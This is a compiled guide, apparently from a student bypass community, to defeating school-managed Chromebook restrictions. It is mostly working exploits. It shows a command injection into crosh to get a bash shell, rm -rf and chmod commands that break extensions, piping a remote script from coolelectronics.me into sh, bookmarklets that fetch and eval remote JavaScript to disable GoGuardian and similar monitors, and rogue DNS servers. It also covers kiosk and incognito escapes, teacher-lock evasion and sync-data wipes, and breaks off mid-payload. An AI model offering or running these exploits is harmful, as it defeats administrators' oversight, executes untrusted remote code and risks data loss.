## Permanently Remove Extensions (Past v106)
Credits: CoolElectronics

This exploit is currently the most flexible and effective method in TN right now as a result of the bounty made by luphoria. Criteria was to simply bypass the Enterprise Policy ArcEnabled: false but resulted in a much more effective exploit in the end.

This exploit details another way to permanently delete extensions. Once done, you can update or restart your chromebook and the extensions will stay gone until you powerwash.

You need a usb for downgrading, and rudimentary knowledge of bash is recommended.

### STEPS:
Downgrade to any version below 103. Instructions are in "Chrome100 - Downgrade your Chrome OS" . Do not ask for help downgrading here.

Hit ctrl alt t to open a crosh window. If it’s blocked by extensions, use LTBEEF. If it’s policy blocked (“The person who set up this computer has chosen to block this site”) you can try downgrading to a version below 90, where crosh had a different URL
Type in `set_cellular_ppp \';bash;exit;\'` and hit enter. 

You now have access to a bash shell, logged in as chronos. More information about the permissions of this shell is at the bottom.

Type `rm -rf ~/Extensions/*`. THIS WILL BREAK EVERY EXTENSION ON YOUR CHROMEBOOK. If there are extensions you want to keep, they can be selectively removed by ID.

Run `chmod 000 ~/Extensions`. This marks the extension folder as read only, stopping it from updating in the future or any new extensions from being installed.

You can now restart chrome, allowing it to update to the latest version. Once rebooted onto the latest version, all removed extensions will have the default icon and won’t function at all

**UPDATE: ROOT IS NOW POSSIBLE! CHECK Root escalation**

You can also run `set_cellular_ppp \'chmod 777 ~/Extensions;rm -rf ~/Extensions;mkdir ~/Extensions;chmod 000 ~/Extensions;echo done;exit\'`  in crosh to do it all in one step

## Root Escalation
Have the ability to run developer mode content, enable developer mode, bypass pretty much everything with one exploit. Will require the downgrade methods. 

Has so many branches that I’m just going to link the Kajig discussion. Check the pins in the TN Discord server.

https://discord.com/channels/419123358698045453/1033537020854800434

## Linux Mint
Boot different Operating Systems on your Chromebook; freeing you from all restrictions, including those that have to do with Chrome OS, itself.

You must be in developer mode. There are ways to do this, which you will have to find out for yourself.
You will need a USB of USB 3.0 or higher, and 32 GB or more of storage. You can buy a good USB here. https://www.amazon.com/SanDisk-256GB-Ultra-Flash-Drive/dp/B07857Y17V
It's really small, so other people won't think anything. They'll just think it's the receiver for your wireless mouse or something.
You will also need another computer.

On your own computer, open Disk Management.
Right-click on C; and select Shrink.
Shrink the partition by 8192 MB.
You will now have 8 GB of free space.
Right-click on the free space, and select New Volume.
Format it as FAT32, and name it Installer.
Give it 8192 MB of storage.
Now, go to https://www.linuxmint.com/edition.php?id=299 and click "Torrent Download: 64-Bit"
Open the file in your BitTorrent client. If you don't have one, download one here: https://www.qbittorrent.org/download.php
Once you have your .iso file, open it in 7-Zip. You can download 7-Zip here: https://www.7-zip.org/download.html
Copy all of the contents of the .iso file to the new drive partition that you've created.
Restart your computer, and boot back into Windows.
Step 2: Setting up the Installer
On the login screen, press the power button in the bottom right corner, hold shift and select Restart.
Keep shift held down.
A blue screen will pop up. Select "Use a Device".
Select Linux Mint, or whatever your UEFI has decided to call Linux Mint. On Acer computers, it may say "Linpus Lite".
Plug in your USB.
A desktop will appear, click "Install Linux Mint".
Go on through the Installer until it asks you for "Installation Type" Select "Something Else".
Click "Device for Bootloader Installation", and select the name of your USB Drive. Note the text to the left of the name of your USB; that is the path. It will usually say "/dev/sda"
You'll want to scroll on the page of the Installer until you see the path that was shown next to the name of your USB.
Select the existing partition(s) on the USB (/dev/sda1, /dev/sda2), and press "-" to make free space.
Select the new free space, and press + to make a new partition.
Make the size 500 MB, Type of partition: Primary, Location for the Partition: Beginning of this new space. Select the box that says "Use as", and select "EFI System Partition". Press OK.
Select the remaining free space, and press + again. Make the size as large as possible, Type of partition: Primary, Location for the partition: Beginning of this new space. Select the box that says "Use as:", and select "Ext4 journaling system".
Click the text box that says "Mount Point", and type a forward slash. (/) Press OK.
Once everything is ready, make sure to check one more time that your USB is set for bootloader installation, then press Install Now.
Select your Time Zone.
Create your user. Please make sure to select "Encrypt my Home Directory"! This is very important for your security, as anyone could take your USB and put it in THEIR computer, and read all of your information!
While you wait for the installation to finish, do Step 3.
Step 3: Firmware
Turn on your Chromebook, and press CTRL + ALT + T to open Crosh.
Make sure to type "shell" to enter bash.
Type cd; curl -LO mrchromebox.tech/firmware-util.sh && sudo bash firmware-util.sh Make sure to run as Chronos. If you run as root, it will install to the wrong places, and mess things up.
After things load, press 1.
Please wait for it to finish, then reboot your Chromebook.
Wait for the installation of Linux Mint to finish before proceeding.
Insert your USB into your Chromebook.
Press CTRL + L on the OS Verification screen, and press 1.
Press escape once the prompt appears at the bottom of your screen, and select Boot Menu.
Select your USB, and press enter.

## [swamp] FOR GOGUARDIAN ONLY: 
Functions like LTBEEF, the GUI based exploit which Bypassi originally lead for disabling extensions. However unlike the Bypassi based exploit, swamp still remains unpatched on versions post v102 up to even v107. 

This will allow you to:
- Disable force-installed extensions similarly to LTBEEF even on Chrome 107 where it's patched
- Run bookmarklets on any page even when they are blocked
- Break GoGuardian until powerwash (or until you choose to turn it back on)
- Run a custom DNS to block network requests without actually being on a DNS
- Run your own custom code with access to most of the chrome API

https://discord.com/channels/419123358698045453/1040775494406250548

## KIOSK Exploit (DE-LICENSED) (Original):
Although many variations of this exploit exist, this was the very original implementation of it. However, the process never went as far or flexible as a full Chrome browser window being able to be created out of this method rather than just a simple bypass within the KIOSK app. 

Credits to B3AT and Divide for this exploit.

This exploit allows you to open an unrestricted Chrome instance within a kiosk app, i.e. with the kiosk user account permissions.

### Steps:
- Any kiosk app installed
- [for v77<=x<=v85] OOBE/fresh install
- Sign out
- Turn wifi off
- Enable chromevox (ctrl+alt+z)
- Open a kiosk app
- Spam Search+o+k (you do have to re-click o and k)
- While spamming click "Diagnose"

Note: The exploit should work consistently v76 or below but it's still possible to pull off on v85 or below, but only once (right after you powerwash).

## UserPolicy Bypass:
This should enable ARC (playstore) and unblock all **policy** blocked URLs.

When you connect to a wifi without the custom DNS the policy will reload to normal but some changes will persist, more testing is needed. This is useful because most root exploits require ARC in some form.

### You need:
- The ability to downgrade to a version below 102
- A way to access crosh. If it's blocked via extension, use LTBEEF. If it's blocked by user policy, you must  use a combination of Incognito Exploit (v81) and Crosh Bypass (Daybreak)
- A router or hotspot capable of either blocking websites via parental control or setting a custom DNS (129.213.58.41)

### Steps:
- Downgrade to a version
- Open crosh (ctrl+alt+t)
- Elevate to a chronos shell by typing in set_cellular_ppp \';bash;exit\'
- Run the command `sh <(curl -k https://coolelectronics.me/bypass.sh) & disown`
- Remove your school account, log out or just clear it in any way you can. The method varies depending on how device policy is set up.
- In your router settings, set the DNS to `129.213.58.41` or `block m.google.com`. (NOT THE NETWORK DNS ON THE CHROMEBOOK, IT WONT WORK; ROUTER!)

**[EXTRAS]:** personalDNSfilter and hotspot or DNS Sinkhole + Hotspot on iOS can be used; NextDNS

- Log into your school account

Results should prompt you about a PIN and Google Play then drop you into an account where everything works as normal but no user policies are set. If you get a "sign in required" error, try steps again.

## LTBEEF - Disable ANY Extension
LTBEEF is an incredibly powerful exploit which can be utilized to disable any extension, including GoGuardian, Securly, Lightspeed, ....

Credits to Bypassi and CompactCow.

### Bookmarklets
**Option A - GUI Based**
```js
javascript:fetch("https://compactcow.com/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
```
Click it once (not on a new tab) to get to the correct webstore page, then again to open the UX.

**Option B - if Option A doesn't load**
- Go to https://chrome.google.com/webstorex and run this bookmarklet
```js
javascript:prompt('Extension IDs here: (seperated by commas)').split(',').forEach(i=>{chrome.management.setEnabled(i.trim(),!1)})
```

### If bookmarklets are disabled:
 - Set your DNS to the following:
    `129.213.138.223`
 - Visit chrome://restart
 - Visit https://chrome.google.com/
 - You should see a warning. Click on the warning symbol (⚠️) and type thisisunsafe.
 - You should see a simple interface which lets you enable and disable your extensions.

## History Deletion #2 (v106+)
**IMPORTANT NOTE: THIS WILL WIPE ALL OTHER SYNCED DATA, NOT JUST HISTORY**

SYNC DATA INCLUDES APPS, NON-MANAGED EXTENSIONS, BOOKMARKS, AND MORE

- Make sure you're synced to google chrome or else it wont work, as you need to be able to access chrome.google.com/sync
- Go to https://chrome.google.com/sync
- Press "clear data" at the bottom
- Sign out of your account and remove the account from the device
- Sign back in and history should be gone

## Downgrade your Chrome OS (Chrome100)
This provides a basic tool required for many exploits as a prerequisite.

Chrome100 is a website which enables you to download old versions of Chrome OS for your Chromebook. 
Old versions may have vulnerabilities which are now patched; thus, these old Chrome OS images are essential for many exploits!

## Ingot Extension Removal (DNS)

- Go to the settings then click the wifi you are on.
- Scroll down to where it says Network, click on that then select Nameservers
- Select Custom Nameservers and then enter in the four prompts `198.98.53.76`
- Go to a new tab and in the url bar type and run `chrome://restart` (this will restart your Chromebook without signing you out)
- Go to a new tab and search `chrome.google.com` if that doesn't work try `https://chrome.google.com/webstoreV5Y8F`
- Type  `thisisunsafe` and the GUI will load.

## Unblocked DevTools/Flags (ADVANCED)
This is a guide on how to use chrome launch options and a thread for discussing exploits related to the bash shell. I have been requested to make this several times

First of all, you will need some knowledge of bash and you must know how to use vi.

This builds off of Permanently Remove Extensions (past v106).

Follow the instructions there, and stop once you have the bash shell.

- Run `cd ~/Downloads`
- Run `vi exploit.sh` to create a new shell file. 
- In this shell file, put the line `pkill -9 chrome`
- After that, head over to `chrome:version`, and next to "command line options:" copy the entire really long thing
- Paste it into vi as a new line.

Now you can add whatever launch options you want! these are like the flags in chrome:flags, but there are way more available. 

The full list is here: https://peter.sh/experiments/chromium-command-line-switches/

Some notable ones are: `--force-devtools-available` (devtools), `--bwsi` (guest mode), `--kiosk`(useless but funny), `--oauth-client-id`(breaks policy updating and profile syncing), `--disable-extensions-except`, `--show-login-dev-overlay`/`--show-oobe-dev-overlay`, `--enable-hangout-services-extension-for-testing`(adds a bunch of useless extensions), and more.

To execute chrome with the launch options set, exit vi (impossible), and run `sh <(cat exploit.sh) & disown`

## IStealYourDNS (DNS)
IStealYourDNS is a TitaniumNetwork-partnered service. With it, you can seamlessly block many web filters (GoGuardian, Lightspeed, ...) and never think about bypassing filters ever again.

### Installation
To install it, simply open your Wi-Fi's DNS settings, and set the name servers to "Custom" - replace any options available with `72.5.33.65`. If you have multiple boxes, set the last one to `1.1.1.1`.

Then, simply restart and you're done!

## Better DNS Bypass (DNS)
- Know the credentials of your School's WIFI or utilize a hotspot
- Go to `chrome:policy` and Ctrl+F for `deviceopennetworkconfig`; click show more
- Edit the attached ONC, changing the GUID to the guid in the policy and the security to the security in the json; same with the name, SSID, and finally change the passphrase to the password
- Import the ONC in `chrome:network#general`
- Go to WIFI settings as normal and the DNS shouldn't be blocked

ONC: https://cdn.discordapp.com/attachments/1042601318105239562/1042928899371323402/bypass.onc

## Get Proton VPN on Chromebooks
- Create or log into a proton vpn account

https://account.protonvpn.com/signup

- Once you have an account go to - account > OpenVPN / IKEv2 username
- Copy the username and password
- Unzip the files and choose one that you want to use (like us-19 or s/t)
- Edit it in the Text editor app (it's a built-in chrome app on Chromebook) or somewhere
- All the way at the end, after "TLSAuthContents": "-----BEGIN OpenVPN Static key V1----- put in 
```
   ,
          "Username": "Username_here",
          "Password": "Password_here"
```
You can just copy and paste it and you'll get the right formatting.

Make sure that you start the paste right after the end quotation mark.
- Save the onc file
- Upload it to `chrome://network#general` all the way at the bottom where it says Import ONC File (don't worry if you don't notice anything, just try scrolling down a little more and it should say `Networks imported: 1` (regardless of how many you actualy imported)

## Incognito Exploit (v81)
This is the first Licensed exploit to be declassified as a Kajig!

This still needs to be improved.

Make sure to downgrade to chrome OS 81 or lower first: "Chrome100 - Downgrade your Chrome OS"

### Steps to the Incognito Exploit, summarized 

(Steps before include getting on the login screen to the part where you are signing in as a new user. Enter your email and password but don't login. Do Alt + Shift + I. Continue to Step 1 where you spam "Privacy Policy".)

- Follow the steps but once it gets to the "Privacy Policy" part, spam it for a minute or 30 seconds (until its very laggy)
- Once you login go quickly to the Incognito Tab and do Ctrl+Shift+N
- Do the Switch/Desktop View key and close the original Incognito Tab
- If it continues to open policy pages, repeat Step 3.

### Benefits:

- No extensions so you won't have to worry about anything being blocked by an extension.
- Access to a fully unrestricted YouTube.
- Ability to sign into other google accounts. (if blocked)
- Be able to access the majority of chrome:// urls if they were blocked by policy.
- Get past policy blocks. (Untested fully but certain sites that were blocked by policy were unblocked for me.)
- Use flags to further experiment with you chromebook. Applies to chrome:// urls being unblocked.
- Access to an "experimental" unblocked chrome. (Called experimental as it is both restricted and not restricted.)

### Possible Errors (you may encounter):

- When importing an onc file, crash.
- Don't go to chrome://os-settings or try to view Settings from the Incognito tab.
- Restarting to modify flags will close the tab, however the effects will be applied when you restart.
- When importing an extension (unpacked or entire crx), you will encounter the error "not allowed on login screen"

The following exploit is still a massive WIP and the following above may be subject to change or expand. 

## Process End Method
- Open Task Manager
- Press 'search'+'esc'
- Scroll all the way to the bottom and find your blocker extension and highlight it (click on it)
- Click 'End Process' it or press 'enter'
- Immediately go to your page and see that it's unblocked
- This will not last unless you use this bookmarklet javascript:onbeforeunload=i=>1

If Task Manager is blocked:

- Go to `chrome-extension://` + your Extension ID + `/_generated_background_page.html`
- You can find the Extension ID by going to the puzzle piece, clicking on the 3 dots next to your filter and click manage extension and the is will be in the url
- The link for GoGuardian is `chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/_generated_background_page.html`
- Change the URL to `chrome://kill` (I recommend making it a bookmark (if your school blocked bookmarklets this one will still work))

## personalDNSfilter/Hotspot
https://f-droid.org/en/packages/dnsfilter.android/

- Download personalDNSfilter from the link
- Install it on phone
- Open the app
- Click on the box beside DNS
- Check the Disable DNS server discovery
- Remove all dns ip
- Set it to one of these choices:

 
### DNS Servers:
- 45.128.53.172 (watch this tutorial https://youtu.be/qo-hx0tOYxI (only works with goguardian
- 129.213.58.41
- 51.161.64.196

### Extras
- wifi network + usb tethering
- cellular network + hotspot
- cellular network + hotspot app

You may need to update the DNS servers on your current phone WIFI network.

## Stealth (Lightspeed)
This trick is specifically for when your chromebook is "locked" by a teacher, and any site you go to will get closed instantly. It can also hide the tab from the teachers and get around the "[teacher's name] has blocked this site" screen.

The way it works is by letting you put an iframe inside of the new tab window, where most chrome extensions don't have permission. This means that if a page is "temporarily blocked" by a teacher or they lock your chromebook you can still access almost every page that works in an iframe. I don't know what it shows up as on the teacher screen, but they likely will just see the new tab and not the actual site.

- Set your default search engine to bing

- Open a new tab

Use this bookmarklet: 
```
javascript:document.write(`<style> iframe{margin:0px; border:none; padding:0px; outline:none} body{margin:0px}</style><iframe src = "${prompt("enter url")}" width = ${window.innerWidth} height = ${window.innerHeight} />`)
```

Enter a url that you want to visit.

Notes:
- This only works if bookmarklets are enabled
- Works ONLY with Lightspeed

## Playstore Bypass (v106+)
Make sure you are upgrading or powerwashing/recovering. Chrome Device Manager's notification should appear otherwise this will not work.

**MAKE SURE TO HAVE A HOME ACCOUNT ADDED!**

- Literally just log out/shutdown/restart when the Chrome Device Manager notif appears. LOCKING DOES NOT WORK.
- Open PlayStore and keep it open. Try to download some apps. Fiddle around with it. Don't switch accounts as that might lock you out.

Add accounts in `settings -> your school account name -> add account`. You don't need to go to Android settings and shouldn't!

**EASIER GUIDE**
After Powerwash, Recovering, removing account and adding it back in:
- The moment `Chrome Device Manager` pops up ( 💼 ) do `chrome://restart`
- After that open Google Play and switch to your home account

## GoGuardian Discord Unblock
This only works for Discord and Youtube.

### Type 1
```
data:text/html,<script>window.location.href='https://discord.com/app?%27+%27e%27.repeat(16380)%3C/script%3E
